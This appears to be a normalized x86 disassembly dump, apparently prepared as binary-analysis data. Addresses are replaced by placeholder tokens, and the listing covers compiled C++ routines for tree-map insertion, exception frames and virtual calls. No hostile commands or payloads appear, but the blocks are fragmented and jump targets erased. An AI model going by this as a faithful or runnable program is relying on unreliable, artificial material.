mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
add ecx 0xc
call sub_405664
test al al
jne r-xdata
xor eax eax
call sub_40f2d4
mov eax [ eax + 0x1c ]
jmp r-xdata
mov eax esi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebx ]
lea edi [ ebp - 0x18 ]
lea esi [ ebp - 0x10 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x18 ] eax
call sub_40f543
test al al
jne r-xdata
sub_419cd6
push 0x30
mov eax sub_43ac98
call sub_425dad
push [ ebp + 0x8 ]
mov eax ebx
call sub_419ffb
mov [ ebp - 0x10 ] eax
test ebx ebx
jne r-xdata
mov eax [ ebx ]
mov ecx [ ebx + 0x18 ]
lea edi [ ebp - 0x1c ]
lea esi [ ebp - 0x14 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] eax
call sub_40f543
test al al
jne r-xdata
call sub_423d5c
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x3c ]
call sub_403de3
xor esi esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] esi
push [ ebp - 0x10 ]
lea eax [ ebp - 0x3c ]
push [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax ebx
call sub_41c008
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push esi
mov [ ebp - 0x14 ] ecx
push 0x1
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x10 ] eax
call sub_40415f
mov ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
add ecx 0xc
call sub_405664
test al al
je r-xdata
lea esi [ ebp - 0x14 ]
call sub_40f2d4
add eax 0x1c
call sub_425e4c
retn 0x4
sub_419d78
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
push [ ebp + 0xc ]
mov eax ebx
call sub_419ffb
mov [ ebp - 0x4 ] eax
test ebx ebx
jne r-xdata
mov eax [ ebx ]
mov ecx [ ebx + 0x18 ]
lea edi [ ebp - 0x10 ]
lea esi [ ebp - 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] eax
call sub_40f543
test al al
jne r-xdata
call sub_423d5c
mov eax [ ebx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea ecx [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
add ecx 0xc
call sub_405664
test al al
jne r-xdata
mov ecx esi
jmp r-xdata
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
pop edi
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop esi
leave
retn 0x8
sub_419dea
push ebp
mov ebp esp
sub esp 0x18
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x18 ]
push edi
mov edi [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
cmp [ edi + 0x2d ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
lea ecx [ edi + 0xc ]
mov [ ebp - 0x4 ] edi
call sub_405664
mov [ ebp - 0x8 ] al
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
mov edi [ ebp - 0x4 ]
mov eax [ esi ]
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] eax
je r-xdata
mov edi [ edi + 0x8 ]
mov edi [ edi ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
lea eax [ edi + 0xc ]
call sub_405664
test al al
je r-xdata
mov ecx [ esi + 0x18 ]
mov ecx [ ecx ]
lea edi [ ebp - 0x18 ]
lea esi [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] eax
call sub_40f543
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
jmp r-xdata
lea esi [ ebp - 0x10 ]
call sub_40f86a
mov edi [ ebp - 0xc ]
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x1
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_419eae
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebx ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
pop edi
mov eax ebx
pop esi
leave
retn 0x8
sub_419eae
push 0x48
mov eax sub_43b0d8
call sub_425dad
mov edi ecx
cmp [ esi + 0x1c ] 0x7fffffe
jb r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ ebp + 0x10 ]
push eax
push edi
push eax
call sub_41a02d
inc [ esi + 0x1c ]
mov ebx eax
mov eax [ esi + 0x18 ]
cmp edi eax
jne r-xdata
push r--data
lea ecx [ ebp - 0x2c ]
call sub_403dc1
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_401065
push r--data
lea eax [ ebp - 0x54 ]
push eax
mov [ ebp - 0x54 ] r--data
call sub_42597b
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ eax + 0x4 ] ebx
mov eax [ esi + 0x18 ]
mov [ eax ] ebx
mov eax [ esi + 0x18 ]
jmp r-xdata
mov [ edi + 0x8 ] ebx
mov eax [ esi + 0x18 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ edi ] ebx
mov eax [ esi + 0x18 ]
cmp edi [ eax ]
jne r-xdata
mov [ eax + 0x8 ] ebx
mov edi ebx
lea eax [ ebx + 0x4 ]
jmp r-xdata
mov [ eax ] ebx
jmp r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x2c ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x2c ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ esi ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ecx
call sub_425e4c
retn 0xc
mov edx [ edx ]
cmp [ edx + 0x2c ] 0x0
jne r-xdata
mov edx [ edx + 0x8 ]
cmp [ edx + 0x2c ] 0x0
je r-xdata
cmp edi [ ecx ]
jne r-xdata
mov [ ecx + 0x2c ] 0x1
mov [ edx + 0x2c ] 0x1
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + 0x2c ] 0x0
mov eax [ eax ]
mov edi [ eax + 0x4 ]
jmp r-xdata
cmp edi [ ecx + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ eax + 0x2c ] 0x1
mov eax [ edi + 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x2c ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ eax + 0x4 ]
push esi
call sub_41c218
push esi
mov edi ecx
call sub_40f8cb
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
mov [ eax + 0x2c ] 0x1
mov eax [ edi + 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x2c ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ eax + 0x4 ]
push esi
call sub_40f8cb
jmp r-xdata
push esi
mov edi ecx
call sub_41c218
sub_419ffb
mov eax [ eax + 0x18 ]
push esi
mov esi [ eax + 0x4 ]
push edi
mov edi eax
jmp r-xdata
cmp [ esi + 0x2d ] 0x0
je r-xdata
mov ecx [ esp + 0xc ]
lea eax [ esi + 0xc ]
call sub_405664
test al al
je r-xdata
mov eax edi
pop edi
pop esi
retn 0x4
mov edi esi
mov esi [ esi ]
mov esi [ esi + 0x8 ]
jmp r-xdata
sub_41a02d
push 0xc
mov eax sub_43a84f
call sub_425de0
mov ebx ecx
push 0x30
call sub_4246c6
and [ ebp - 0x4 ] 0x0
mov esi eax
pop ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
mov eax esi
call sub_425e4c
retn 0xc
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0x10 ]
lea edi [ esi + 0xc ]
push ebx
mov ecx edi
mov [ esi + 0x8 ] eax
call sub_403de3
mov eax [ ebx + 0x1c ]
mov [ edi + 0x1c ] eax
mov [ esi + 0x2c ] 0x0
mov [ esi + 0x2d ] 0x0
sub_41a0c2
push 0xcc
mov eax sub_43ce4b
call sub_425dad
mov ebx [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x10 ] eax
lea edi [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov [ edi ] r--data
mov [ ebx + 0x8 ] r--data
mov [ ebx + 0xc ] r--data
mov [ ebp - 0x4 ] 0x3
lea esi [ ebx + 0x14 ]
push 0x4
mov [ ebx ] r--data
mov [ edi ] r--data
mov [ ebx + 0x8 ] r--data
mov [ ebx + 0xc ] r--data
mov [ ebx + 0x10 ] eax
mov [ ebp - 0x14 ] esi
call sub_4246c6
pop ecx
test eax eax
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov eax ebx
call sub_425e4c
retn 0x8
mov eax rw-data
mov esi ebx
call sub_40d9a7
push edi
mov edi [ ebx + 0x34 ]
call sub_40d87c
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x8 ]
push eax
call sub_40db0d
push 0x80
call sub_4246c6
pop ecx
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x7
test eax eax
je r-xdata
mov [ esi ] eax
mov [ ebp - 0x4 ] 0x4
call sub_414157
lea ecx [ esi + 0x18 ]
mov [ ecx ] eax
mov [ eax + 0x2d ] 0x1
mov eax [ ecx ]
mov [ eax + 0x4 ] eax
mov eax [ ecx ]
mov [ eax ] eax
mov ecx [ ecx ]
mov [ ecx + 0x8 ] ecx
and [ esi + 0x1c ] 0x0
mov eax [ ebp + 0xc ]
and [ ebx + 0x38 ] 0x0
lea esi [ ebx + 0x40 ]
mov [ ebx + 0x34 ] eax
call sub_403dae
mov [ ebp - 0x4 ] 0x6
mov ecx [ ebx + 0x34 ]
mov [ ebx + 0x5c ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push r--data
lea ecx [ ebp - 0x30 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x8
mov eax [ ebx + 0x34 ]
mov [ ebp - 0x10 ] 0x1
call sub_4049ca
add eax 0x70
push eax
lea eax [ ebp - 0xd8 ]
push eax
call sub_401152
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0xd8 ]
mov [ ebp - 0x4 ] 0x9
push eax
push [ ebp + 0xc ]
mov [ ebp - 0x10 ] 0x3
call sub_419691
jmp r-xdata
mov [ ebp - 0x4 ] 0x6
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea esi [ ebp - 0xd8 ]
call sub_4011ad
test [ ebp - 0x10 ] 0x2
mov [ ebx + 0x3c ] eax
je r-xdata
push 0x28
call sub_4246c6
pop ecx
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0xc
test eax eax
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_40415f
xor eax eax
push [ ebx + 0x34 ]
push eax
call sub_419008
jmp r-xdata
mov [ ebx + 0x38 ] eax
sub_41a282
push 0x14
mov eax sub_43cd9e
call sub_425dad
mov ebx ecx
mov [ ebp - 0x18 ] ebx
lea edi [ ebx + 0x4 ]
lea esi [ ebx + 0x8 ]
mov [ ebx ] r--data
mov [ edi ] r--data
mov [ esi ] r--data
mov [ ebx + 0xc ] r--data
mov [ ebp - 0x4 ] 0x5
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x2c ]
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
mov [ ebp - 0x14 ] eax
push eax
mov eax rw-data
call sub_40d9c4
mov eax [ ebx + 0x34 ]
push ebx
call sub_40d922
mov eax [ ebx + 0x34 ]
mov [ ebp - 0x10 ] edi
test edi edi
je r-xdata
lea edi [ ebx + 0x14 ]
call sub_41bf2c
push 0x0
push 0x1
lea ecx [ ebx + 0x40 ]
call sub_40415f
push edi
mov [ ebp - 0x4 ] 0x3
call sub_41bf04
mov [ ebx + 0xc ] r--data
mov [ ebx + 0x8 ] r--data
mov [ ebx + 0x4 ] r--data
mov [ ebx ] r--data
call sub_425e4c
retn
call sub_40f2d4
mov eax [ eax + 0x1c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x34 ]
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
lea edi [ eax + 0x2dc ]
lea eax [ ebp - 0x10 ]
call sub_40f16e
lea esi [ ebp - 0x14 ]
call sub_41bfbb
jmp r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
mov ecx [ ebx + 0x3c ]
test ecx ecx
je r-xdata
lea edi [ eax + 0x314 ]
lea eax [ ebp - 0x10 ]
call sub_40f16e
mov eax [ ebx + 0x2c ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx + 0x14 ]
lea edi [ ebp - 0x20 ]
lea esi [ ebp - 0x14 ]
mov [ ebp - 0x20 ] eax
call sub_40f543
test al al
jne r-xdata
mov ecx [ ebx + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_41a3a4
push 0xb8
mov eax sub_43f64a
call sub_425dad
and [ ebp - 0x10 ] 0x0
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x2c ]
mov eax [ eax ]
add ebx 0x14
mov [ ebp - 0x14 ] eax
mov eax [ ebx ]
mov [ ebp - 0x18 ] eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x14 ]
mov edi [ ebp - 0x18 ]
mov [ ebp - 0x48 ] eax
call sub_41bfbb
mov eax [ ebp - 0x48 ]
lea esi [ ebp - 0x3c ]
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x38 ] eax
call sub_40f2d4
mov eax [ eax + 0x1c ]
test eax eax
je r-xdata
xor edi edi
lea edi [ esi + 0xc ]
jmp r-xdata
push [ ebp - 0x48 ]
lea eax [ ebp - 0x8c ]
push edi
push eax
push ebx
call sub_40fc47
jmp r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
xor edi edi
push r--data
lea ecx [ ebp - 0xa8 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x2
push r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x10 ] ebx
call sub_403dc1
push 0x3
pop eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] eax
push esi
lea eax [ ebp - 0xa8 ]
push eax
lea eax [ ebp - 0x84 ]
push eax
push [ ebp - 0x14 ]
call sub_41ec78
mov edi eax
jmp r-xdata
push r--data
lea ecx [ ebp - 0x84 ]
call sub_403dc1
and [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x38 ]
push edi
lea eax [ ebp - 0x84 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
call sub_4190f2
xor ebx ebx
push 0x0
inc ebx
push ebx
lea ecx [ ebp - 0x34 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
xor esi esi
push esi
push ebx
lea ecx [ ebp - 0x84 ]
call sub_40415f
push 0x80
call sub_4246c6
pop ecx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax esi
je r-xdata
mov eax [ ebx + 0x18 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebx ]
lea edi [ ebp - 0x44 ]
lea esi [ ebp - 0x18 ]
mov [ ebp - 0x44 ] eax
call sub_40f543
test al al
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
push esi
push ebx
lea ecx [ ebp - 0x84 ]
call sub_40415f
test [ ebp - 0x10 ] 0x2
je r-xdata
push r--data
lea ecx [ ebp - 0x34 ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x6
call sub_403dc1
lea ecx [ ebp - 0x34 ]
push ecx
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x7
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x10 ]
push esi
push ebx
lea ecx [ ebp - 0x68 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push ebx
lea ecx [ ebp - 0x34 ]
call sub_40415f
push r--data
lea ecx [ ebp - 0x34 ]
call sub_403dc1
lea eax [ ebp - 0x68 ]
push eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x8
push [ eax + 0x34 ]
call sub_40d136
push eax
lea eax [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x9
mov edx [ edi ]
push eax
mov ecx edi
call [ edx + 0x10 ]
push esi
push ebx
lea ecx [ ebp - 0x68 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push ebx
lea ecx [ ebp - 0x34 ]
call sub_40415f
push 0x80
call sub_4246c6
pop ecx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0xa
cmp eax esi
je r-xdata
and [ ebp - 0x10 ] 0xfffffffe
push esi
push ebx
lea ecx [ ebp - 0xa8 ]
call sub_40415f
mov [ ebp - 0x14 ] esi
push r--data
lea ecx [ ebp - 0x68 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0xb
or [ ebp - 0x10 ] 0x4
push r--data
lea ecx [ ebp - 0x34 ]
call sub_403dc1
lea eax [ ebp - 0x68 ]
push eax
lea eax [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0xc
or [ ebp - 0x10 ] 0x8
push eax
push [ ebp - 0x14 ]
xor bl bl
call sub_41ed6b
xor ebx ebx
inc ebx
mov [ ebp - 0x14 ] eax
xor esi esi
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x4
je r-xdata
and [ ebp - 0x10 ] 0xfffffff7
push esi
push ebx
lea ecx [ ebp - 0x34 ]
call sub_40415f
test [ ebp - 0x10 ] 0x8
je r-xdata
push r--data
lea ecx [ ebp - 0xc4 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0xf
mov ecx [ ebp - 0x14 ]
mov eax [ ecx ]
push rw-data
lea edx [ ebp - 0xc4 ]
push edx
call [ eax + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
push esi
push ebx
lea ecx [ ebp - 0xc4 ]
call sub_40415f
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x34 ]
mov eax [ ecx ]
push edi
call [ eax + 0x14 ]
call sub_425e4c
retn 0x4
push esi
push ebx
lea ecx [ ebp - 0x68 ]
call sub_40415f
sub_41a683
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_43cd3c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x98
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xa8 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov edi [ ebp + 0x8 ]
xor esi esi
mov [ esp + 0x10 ] esi
mov eax [ edi ]
mov ecx edi
call [ eax + 0x68 ]
mov ecx edi
cmp eax 0x4
jne r-xdata
mov eax [ edi ]
call [ eax + 0x68 ]
mov ecx edi
cmp eax 0x2
jne r-xdata
push esi
push ebx
call sub_41b77f
cmp [ ebx + 0x10 ] esi
je r-xdata
mov eax [ edi ]
call [ eax + 0x68 ]
cmp eax 0x8
jne r-xdata
xor esi esi
inc esi
push esi
push ebx
call sub_41b77f
push 0x80
call sub_4246c6
pop ecx
mov [ esp + 0x14 ] eax
xor edi edi
mov [ esp + 0xb0 ] edi
cmp eax edi
je r-xdata
mov ecx [ ebx + 0x34 ]
mov eax [ ecx ]
call [ eax + 0x28 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ecx ]
lea edx [ ebx + 0x14 ]
push edx
call [ eax + 0x18 ]
xor al al
cmp [ ebx + 0x10 ] esi
je r-xdata
test [ esp + 0x10 ] 0x2
je r-xdata
push r--data
lea ecx [ esp + 0x1c ]
call sub_403dc1
mov [ esp + 0xb0 ] 0x1
push r--data
lea ecx [ esp + 0x70 ]
mov [ esp + 0x14 ] esi
call sub_403dc1
push edi
lea eax [ esp + 0x1c ]
push eax
lea eax [ esp + 0x74 ]
mov [ esp + 0xb8 ] 0x2
push eax
push [ esp + 0x20 ]
mov [ esp + 0x20 ] 0x3
call sub_41ec78
mov edi eax
mov ecx [ esp + 0xa8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ebx + 0x10 ]
mov eax [ ebx ]
push edi
mov ecx ebx
call [ eax + 0x30 ]
or [ esp + 0xb0 ] 0xffffffff
test [ esp + 0x10 ] 0x1
je r-xdata
and [ esp + 0x10 ] 0xfffffffd
push 0x0
push esi
lea ecx [ esp + 0x74 ]
call sub_40415f
push r--data
lea ecx [ esp + 0x38 ]
call sub_403dc1
mov ecx [ ebp + 0x8 ]
mov [ esp + 0xb0 ] 0x5
mov esi [ edi ]
mov eax [ ecx ]
add esi 0x10
call [ eax + 0x74 ]
push eax
lea eax [ esp + 0x38 ]
push eax
mov ecx edi
call [ esi ]
or [ esp + 0xb0 ] 0xffffffff
xor esi esi
push esi
push 0x1
lea ecx [ esp + 0x3c ]
call sub_40415f
push r--data
lea ecx [ esp + 0x8c ]
call sub_403dc1
push r--data
lea ecx [ esp + 0x54 ]
mov [ esp + 0xb4 ] 0x6
call sub_403dc1
lea ecx [ esp + 0x88 ]
push ecx
lea ecx [ esp + 0x54 ]
mov [ esp + 0xb4 ] 0x7
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x10 ]
push esi
push 0x1
lea ecx [ esp + 0x58 ]
call sub_40415f
or [ esp + 0xb0 ] 0xffffffff
push esi
push 0x1
lea ecx [ esp + 0x90 ]
call sub_40415f
mov ebx [ ebx + 0x34 ]
mov eax [ ebx ]
push edi
mov ecx ebx
call [ eax + 0x14 ]
jmp r-xdata
push 0x0
push esi
lea ecx [ esp + 0x20 ]
call sub_40415f
mov al 0x1
jmp r-xdata
sub_41a8a7
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_43bbc7
mov eax [ fs : 0x0 ]
push eax
sub esp 0x90
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x88 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xa0 ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebx ]
mov [ esp + 0x24 ] ecx
mov ecx ebx
call [ eax + 0x68 ]
cmp eax 0x80
je r-xdata
mov ecx [ esp + 0xa0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x88 ]
xor ecx esp
call sub_4234de
mov esp ebp
pop ebp
retn 0x4
lea eax [ esp + 0x60 ]
push eax
call sub_403eef
and [ esp + 0xa8 ] 0x0
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x3c ]
mov edi eax
mov eax [ edi + 0x14 ]
mov eax [ eax ]
mov [ esp + 0x14 ] eax
mov eax [ edi ]
mov [ esp + 0x20 ] edi
mov [ esp + 0x10 ] eax
call sub_423d5c
cmp [ esp + 0x10 ] eax
je r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x6c ]
mov esi [ esp + 0x24 ]
add eax 0x70
push eax
lea eax [ esp + 0x14 ]
push eax
add esi 0x10
push esi
call sub_41bf50
mov eax [ esi + 0x18 ]
mov [ esp + 0x1c ] eax
mov eax [ esi ]
lea edi [ esp + 0x18 ]
lea esi [ esp + 0x10 ]
mov [ esp + 0x18 ] eax
call sub_40f543
test al al
mov eax [ ebx ]
mov ecx ebx
jne r-xdata
lea esi [ esp + 0x10 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
cmp [ esp + 0x14 ] esi
je r-xdata
call [ eax + 0x6c ]
mov esi [ esp + 0x24 ]
mov ecx [ esi + 0x38 ]
mov edi eax
mov eax [ ecx ]
call [ eax + 0xc ]
lea edx [ edi + 0x70 ]
mov ecx eax
mov eax edx
call sub_40561a
test al al
je r-xdata
call [ eax + 0x7c ]
mov edi r--data
cmp eax 0x6
jne r-xdata
lea esi [ esp + 0x10 ]
call sub_408d54
jmp r-xdata
xor edi edi
push edi
lea ecx [ esp + 0x80 ]
mov [ esp + 0x98 ] 0xf
call sub_404490
push r--data
lea ecx [ esp + 0x2c ]
mov [ esp + 0xac ] 0x1
call sub_403dc1
mov [ esp + 0xa8 ] 0x2
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
lea edx [ esp + 0x28 ]
push edx
lea edx [ esp + 0x48 ]
push edx
call [ eax + 0x40 ]
mov [ esp + 0xa8 ] 0x3
cmp [ eax + 0x18 ] 0x10
jb r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x7c ]
cmp eax 0x6
mov eax [ ebx ]
mov edi r--data
mov ecx ebx
jne r-xdata
call sub_40f2d4
mov esi [ eax + 0x1c ]
mov eax [ ebx ]
mov ecx ebx
mov [ esp + 0x18 ] esi
call [ eax + 0x6c ]
mov esi [ esi ]
mov [ esp + 0x20 ] eax
mov eax [ ebx ]
mov ecx ebx
add esi 0x2c
call [ eax + 0x7c ]
mov ecx [ esp + 0x18 ]
push eax
push [ esp + 0x24 ]
call [ esi ]
push edi
lea ecx [ esp + 0x2c ]
call sub_403dc1
lea esi [ esp + 0x10 ]
mov [ esp + 0xa8 ] 0x9
call sub_40f2d4
mov esi [ eax + 0x1c ]
mov eax [ ebx ]
lea ecx [ esp + 0x28 ]
push ecx
lea ecx [ esp + 0x48 ]
push ecx
mov ecx ebx
call [ eax + 0x84 ]
mov [ esp + 0x18 ] eax
mov [ esp + 0xa8 ] 0xa
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x6c ]
push [ esp + 0x18 ]
mov edx [ esi ]
push eax
mov ecx esi
call [ edx + 0x30 ]
push 0x0
push 0x1
lea ecx [ esp + 0x4c ]
call sub_40415f
push 0x0
push 0x1
lea ecx [ esp + 0x30 ]
mov [ esp + 0xb0 ] 0x0
call sub_40415f
lea esi [ esp + 0x10 ]
call sub_40f2d4
mov esi [ eax + 0x1c ]
mov eax [ ebx ]
mov ecx ebx
mov [ esp + 0x20 ] esi
call [ eax + 0x6c ]
mov esi [ esi ]
mov [ esp + 0x18 ] eax
mov eax [ ebx ]
mov ecx ebx
add esi 0x34
call [ eax + 0x80 ]
mov ecx [ esp + 0x20 ]
push eax
push [ esp + 0x1c ]
call [ esi ]
call sub_40f2d4
mov esi [ eax + 0x1c ]
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x6c ]
mov edx [ esi ]
push eax
mov ecx esi
call [ edx + 0x40 ]
jmp r-xdata
cmp [ esp + 0x10 ] 0x0
mov esi [ edi + 0x14 ]
mov eax [ edi ]
je r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
lea eax [ esp + 0x60 ]
call sub_403f2c
mov ecx [ esi + 0xc ]
mov eax [ ecx ]
push ebx
call [ eax + 0x2c ]
call [ eax + 0x6c ]
mov [ esp + 0x10 ] eax
mov eax [ esi + 0x38 ]
mov eax [ eax ]
add eax 0x2c
mov [ esp + 0x18 ] eax
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x7c ]
mov ecx [ esi + 0x38 ]
push eax
push [ esp + 0x14 ]
mov eax [ esp + 0x20 ]
call [ eax ]
push edi
lea ecx [ esp + 0x2c ]
call sub_403dc1
lea ecx [ esp + 0x28 ]
push ecx
lea ecx [ esp + 0x48 ]
mov [ esp + 0xac ] 0xd
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x84 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0xa8 ] 0xe
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x6c ]
push [ esp + 0x10 ]
mov ecx [ esi + 0x38 ]
mov edx [ ecx ]
push eax
call [ edx + 0x30 ]
push 0x0
push 0x1
lea ecx [ esp + 0x4c ]
call sub_40415f
push 0x0
push 0x1
lea ecx [ esp + 0x30 ]
mov [ esp + 0xb0 ] 0x0
call sub_40415f
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x6c ]
mov [ esp + 0x10 ] eax
mov eax [ esi + 0x38 ]
mov eax [ eax ]
add eax 0x34
mov [ esp + 0x18 ] eax
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x80 ]
mov ecx [ esi + 0x38 ]
push eax
push [ esp + 0x14 ]
mov eax [ esp + 0x20 ]
call [ eax ]
call [ eax + 0x6c ]
mov ecx [ esi + 0x38 ]
mov edx [ ecx ]
push eax
call [ edx + 0x40 ]
jmp r-xdata
push edi
lea ecx [ esp + 0x2c ]
call sub_403dc1
